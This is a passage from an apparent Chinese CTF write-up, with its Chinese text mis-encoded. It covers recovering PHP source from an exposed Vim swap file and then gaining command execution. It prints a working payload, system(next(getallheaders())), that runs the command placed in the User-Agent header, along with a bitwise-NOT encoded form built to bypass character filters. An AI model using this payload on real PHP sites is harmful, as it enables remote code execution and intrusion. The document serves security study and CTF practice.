åªæƒ³æŸ¥çœ‹ .swp æ–‡ä»¶çš„å†…å®¹ï¼Œå°½ç®¡å®ƒæ˜¯äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œä½ å¯ä»¥ä½¿ç”¨ Vim çš„äºŒè¿›åˆ¶æ¨¡å¼æ¥æŸ¥çœ‹ã€‚æ³¨æ„ï¼Œè¿™ä¸æ˜¯å¸¸è§æ“ä½œï¼Œè€Œä¸”é€šå¸¸ä¸ä¼šæœ‰å¾ˆå¥½çš„é˜…è¯»ä½“éªŒï¼Œä½†å¯ä»¥å¸®åŠ©ä½ æ£€æŸ¥äº¤æ¢æ–‡ä»¶çš„ä¸€äº›ç»†èŠ‚ã€‚æ­¥éª¤å¦‚ä¸‹ï¼š</span><br><span class="line">vim -b example.txt.swp</span><br><span class="line"></span><br><span class="line">åœ¨ Vim ä¸­ï¼Œä½¿ç”¨ä»¥ä¸‹å‘½ä»¤å¯ä»¥åˆ‡æ¢åˆ°åå…­è¿›åˆ¶æ¨¡å¼ï¼Œè¿™æ ·ä½ å¯ä»¥æ›´æ–¹ä¾¿åœ°æŸ¥çœ‹äºŒè¿›åˆ¶å†…å®¹ï¼š</span><br><span class="line">:%!xxd</span><br><span class="line"></span><br><span class="line">è¦è¿”å›æ™®é€šæ¨¡å¼ï¼Œå¯ä»¥ä½¿ç”¨ï¼š</span><br><span class="line">:%!xxd -r</span><br><span class="line"></span><br><span class="line">4. ä½¿ç”¨ xxd æŸ¥çœ‹ .swp æ–‡ä»¶</span><br><span class="line">ä½ ä¹Ÿå¯ä»¥ä½¿ç”¨ xxd å‘½ä»¤æ¥æŸ¥çœ‹ .swp æ–‡ä»¶çš„å†…å®¹ï¼š</span><br><span class="line">xxd example.txt.swp | less</span><br><span class="line">è¿™ä¼šå°† .swp æ–‡ä»¶è½¬æ¢ä¸ºåå…­è¿›åˆ¶æ˜¾ç¤ºï¼Œä¾¿äºæŸ¥çœ‹ã€‚</span><br><span class="line"></span><br><span class="line">5. ç¡®å®šå¦‚ä½•å¤„ç† .swp æ–‡ä»¶</span><br><span class="line">å¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œä½ éœ€è¦æ ¹æ® Vim çš„æç¤ºæ¥å†³å®šå¦‚ä½•å¤„ç† .swp æ–‡ä»¶ã€‚ä¾‹å¦‚ï¼Œå½“ä½ å°è¯•æ‰“å¼€ä¸€ä¸ªæ–‡ä»¶æ—¶ï¼ŒVim ä¼šæç¤ºäº¤æ¢æ–‡ä»¶å·²ç»å­˜åœ¨ï¼Œå¹¶ç»™å‡ºå‡ ç§å¤„ç†é€‰é¡¹ï¼š</span><br><span class="line"></span><br><span class="line">O: åªè¯»æ‰“å¼€æ–‡ä»¶ã€‚</span><br><span class="line">E: ç»§ç»­ç¼–è¾‘æ–‡ä»¶ï¼Œå¿½ç•¥äº¤æ¢æ–‡ä»¶ã€‚</span><br><span class="line">R: æ¢å¤æ–‡ä»¶ï¼Œå°è¯•ä»äº¤æ¢æ–‡ä»¶ä¸­æ¢å¤æ•°æ®ã€‚</span><br><span class="line">D: åˆ é™¤äº¤æ¢æ–‡ä»¶ï¼Œé€šå¸¸åœ¨ç¡®è®¤æ²¡æœ‰å…¶ä»– Vim å®ä¾‹åœ¨ç¼–è¾‘è¯¥æ–‡ä»¶æ—¶ä½¿ç”¨ã€‚</span><br><span class="line">Q: é€€å‡ºï¼Œä¸è¿›è¡Œä»»ä½•æ“ä½œã€‚</span><br><span class="line">A: ä¸­æ­¢æ“ä½œï¼Œç±»ä¼¼äºé€€å‡ºã€‚</span><br><span class="line">é€‰æ‹©é€‚å½“çš„é€‰é¡¹ï¼Œå¤„ç†äº¤æ¢æ–‡ä»¶åå†ç»§ç»­ç¼–è¾‘ä¸»æ–‡ä»¶ã€‚</span><br><span class="line"></span><br><span class="line">é€šè¿‡è¿™äº›æ–¹æ³•ï¼Œä½ å¯ä»¥ç”¨ Vim æ‰“å¼€å’ŒæŸ¥çœ‹ .swp æ–‡ä»¶ã€‚è¦ç‰¹åˆ«æ³¨æ„çš„æ˜¯ï¼Œ.swp æ–‡ä»¶ä¸»è¦ç”¨äº Vim çš„æ•°æ®æ¢å¤ï¼Œæ‰€ä»¥ä¸€èˆ¬ä¸å»ºè®®ç›´æ¥ç¼–è¾‘å®ƒä»¬ï¼Œè€Œæ˜¯é€šè¿‡æ¢å¤å’Œå¤„ç†çš„æ–¹å¼è¿›è¡Œæ“ä½œã€‚</span><br></pre></td></tr></table></figure><p>ç„¶åï¼Œæˆ‘ä»¬ç›´æ¥è®¿é—®&#x2F;.index.php.swp</p><p><img src="https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202406042053910.png" alt="img"></p><p>åœ¨kaliä¸­æ‰“å¼€ vim -r index.php.swp</p><p><img src="https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202406042051195.png" alt="img"></p><p>æºç å¦‚ä¸Š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">substr(md5(mt_rand() . sha1(mt_rand())), 0, 5) æ˜¯ä¸€æ®µ PHP ä»£ç ï¼Œç”¨äºç”Ÿæˆä¸€ä¸ªé•¿åº¦ä¸º 5 çš„éšæœºå­—ç¬¦ä¸²ã€‚ä¸‹é¢æ˜¯è¿™æ®µä»£ç çš„å…·ä½“è§£æï¼š</span><br><span class="line"></span><br><span class="line">mt_rand():</span><br><span class="line"></span><br><span class="line">mt_rand() æ˜¯ä¸€ä¸ªç”Ÿæˆéšæœºæ•´æ•°çš„å‡½æ•°ï¼ŒåŸºäº Mersenne Twister ç®—æ³•ï¼Œæ¯” rand() æ›´å¿«å¹¶ä¸”æä¾›æ›´é«˜çš„éšæœºæ€§ã€‚</span><br><span class="line">è¯¥å‡½æ•°ä¼šè¿”å›ä¸€ä¸ªä»‹äº 0 å’Œ RAND_MAX ä¹‹é—´çš„éšæœºæ•´æ•°ã€‚</span><br><span class="line">sha1(mt_rand()):</span><br><span class="line"></span><br><span class="line">ç”Ÿæˆä¸€ä¸ªéšæœºæ•´æ•°ï¼Œç„¶åè®¡ç®—å…¶ SHA-1 å“ˆå¸Œå€¼ã€‚</span><br><span class="line">SHA-1 å“ˆå¸Œå€¼æ˜¯ä¸€ä¸ª 40 å­—ç¬¦çš„åå…­è¿›åˆ¶å­—ç¬¦ä¸²ã€‚</span><br><span class="line">è¿æ¥éšæœºå€¼å’Œ SHA-1 å“ˆå¸Œå€¼:</span><br><span class="line"></span><br><span class="line">mt_rand() . sha1(mt_rand()) ç”Ÿæˆä¸¤ä¸ªéšæœºæ•´æ•°ï¼Œå¹¶å°†å®ƒä»¬çš„å€¼è¿æ¥èµ·æ¥ã€‚</span><br><span class="line">md5():</span><br><span class="line"></span><br><span class="line">å¯¹è¿æ¥åçš„å­—ç¬¦ä¸²è®¡ç®—å…¶ MD5 å“ˆå¸Œå€¼ã€‚</span><br><span class="line">MD5 å“ˆå¸Œå€¼æ˜¯ä¸€ä¸ª 32 å­—ç¬¦çš„åå…­è¿›åˆ¶å­—ç¬¦ä¸²ã€‚</span><br><span class="line">substr():</span><br><span class="line"></span><br><span class="line">ä»ç”Ÿæˆçš„ MD5 å“ˆå¸Œå€¼ä¸­æå–å‰ 5 ä¸ªå­—ç¬¦ã€‚</span><br><span class="line">ç»„åˆèµ·æ¥ï¼Œä»£ç çš„å…·ä½“æ‰§è¡Œé¡ºåºå¦‚ä¸‹ï¼š</span><br><span class="line"></span><br><span class="line">è°ƒç”¨ mt_rand() ç”Ÿæˆä¸€ä¸ªéšæœºæ•´æ•°ã€‚</span><br><span class="line">è°ƒç”¨ sha1() ç”Ÿæˆå¦ä¸€ä¸ªéšæœºæ•´æ•°çš„ SHA-1 å“ˆå¸Œå€¼ã€‚</span><br><span class="line">å°†è¿™ä¸¤ä¸ªå€¼è¿æ¥èµ·æ¥å½¢æˆä¸€ä¸ªå­—ç¬¦ä¸²ã€‚</span><br><span class="line">è®¡ç®—è¿™ä¸ªå­—ç¬¦ä¸²çš„ MD5 å“ˆå¸Œå€¼ã€‚</span><br><span class="line">ä» MD5 å“ˆå¸Œå€¼ä¸­æå–å‰ 5 ä¸ªå­—ç¬¦ã€‚</span><br><span class="line">å› æ­¤ï¼Œä»£ç çš„ä½œç”¨æ˜¯ç”Ÿæˆä¸€ä¸ªç›¸å¯¹éšæœºçš„ 5 å­—ç¬¦é•¿çš„å­—ç¬¦ä¸²</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°è¿›è¡Œäº†é•¿åº¦é™åˆ¶å’Œè¿‡æ»¤ï¼Œå¹¶ä¸”é‚£ä¸ªmd5å€¼ä¹Ÿåœ¨å˜åŒ–ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">å‰ç½®çŸ¥è¯†ï¼š</span><br><span class="line"></span><br><span class="line">(<span class="string">&#x27;phpinfo&#x27;</span>)()</span><br><span class="line">[<span class="string">&#x27;phpinfo&#x27;</span>][<span class="number">0</span>]()</span><br><span class="line">[<span class="string">&#x27;phpinfo&#x27;</span>]&#123;<span class="number">0</span>&#125;()</span><br><span class="line">æ•ˆæœä½œç”¨æ˜¯ä¸€æ ·çš„ã€‚</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">phpinfo</span>(): [~%<span class="number">8</span>F%<span class="number">97</span>%<span class="number">8</span>F%<span class="number">96</span>%<span class="number">91</span>%<span class="number">99</span>%<span class="number">90</span>][~%CF]();</span><br><span class="line">åŠ è¿™ä¸ª[~%FF]åªæ˜¯å› ä¸ºphp7çš„è§£ææ–¹å¼ï¼Œå½“ç„¶æ¢æˆå…¶ä»–çš„ä¹Ÿå¯ä»¥ä¾‹å¦‚[~%EF] [~%CF]</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">getallheaders</span>() è·å–æ‰€æœ‰ HTTP å¤´ä¿¡æ¯ï¼Œè¿”å›ä¸€ä¸ªå…³è”æ•°ç»„ã€‚</span><br><span class="line"><span class="title function_ invoke__">next</span>() è¯•å›¾å°†æ•°ç»„çš„å†…éƒ¨æŒ‡é’ˆç§»åŠ¨åˆ°ä¸‹ä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¿”å›è¯¥å…ƒç´ çš„å€¼ã€‚</span><br><span class="line"></span><br><span class="line">å‡è®¾ HTTP å¤´åŒ…å«ä»¥ä¸‹ä¿¡æ¯ï¼š</span><br><span class="line"><span class="title function_ invoke__">Array</span></span><br><span class="line">(</span><br><span class="line">    [Host] =&gt; example.com</span><br><span class="line">    [User-Agent] =&gt; Mozilla/<span class="number">5.0</span></span><br><span class="line">    [Accept] =&gt; text/html</span><br><span class="line">    [Connection] =&gt; keep-alive</span><br><span class="line">)</span><br><span class="line">å½“ä½ æ‰§è¡Œ <span class="title function_ invoke__">next</span>(<span class="title function_ invoke__">getallheaders</span>()) æ—¶ï¼š</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$headers</span> = <span class="title function_ invoke__">getallheaders</span>(); <span class="comment">// è·å–æ‰€æœ‰ HTTP å¤´ä¿¡æ¯</span></span><br><span class="line"><span class="variable">$nextHeader</span> = <span class="title function_ invoke__">next</span>(<span class="variable">$headers</span>); <span class="comment">// å°†æŒ‡é’ˆç§»åŠ¨åˆ°ä¸‹ä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¿”å›è¯¥å…ƒç´ çš„å€¼</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$nextHeader</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">åœ¨è¿™ä¸ªç¤ºä¾‹ä¸­ï¼Œ<span class="variable">$nextHeader</span> å°†åŒ…å« Mozilla/<span class="number">5.0</span>ï¼Œå› ä¸ºè¿™æ˜¯æ•°ç»„ä¸­çš„ç¬¬äºŒä¸ªå…ƒç´ ã€‚</span><br></pre></td></tr></table></figure><p>å› ä¸ºUAæ˜¯å¯æ§çš„ï¼Œæ‰€ä»¥ä¸€èˆ¬åœ¨UAè¿›è¡ŒRCE</p><p>ç„¶åï¼Œæˆ‘ä»¬æŠ“åŒ…çœ‹ä¸€ä¸‹</p><p><img src="https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202406042052054.png" alt="img"></p><p>åœ¨ç¬¬äºŒä½ï¼Œæ‰€ä»¥æ„é€ è¯­å¥æ‹¿åˆ°httpå¤´ï¼Œå¹¶ä¸”æ‰§è¡Œåœ¨UAä¸­çš„å‘½ä»¤</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">å³ï¼š<span class="title function_ invoke__">system</span>(<span class="title function_ invoke__">next</span>(<span class="title function_ invoke__">getallheaders</span>()))</span><br></pre></td></tr></table></figure><p>ç„¶åï¼Œè¿›è¡Œå–åç»•è¿‡</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[~%8C%86%8C%8B%9A%92][!%FF]([~%91%9A%87%8B][!%FF]([~%98%9A%8B%9E%93%93%97%9A%9E%9B%9A%8D%8C][!%FF]()));</span><br></pre></td></tr></table></figure><p><img src="https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202406042052657.png" alt="img"></p><p>æŸ¥çœ‹æ•ˆæœ</p><p><img src="https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202406042053275.png" alt="img"></p><p>ç„¶åï¼Œç›´æ¥cat &#x2F;flll1114gggggg</p><p><img src="https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202406042053789.png" alt="img"></p><p>å‚è€ƒï¼š<a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
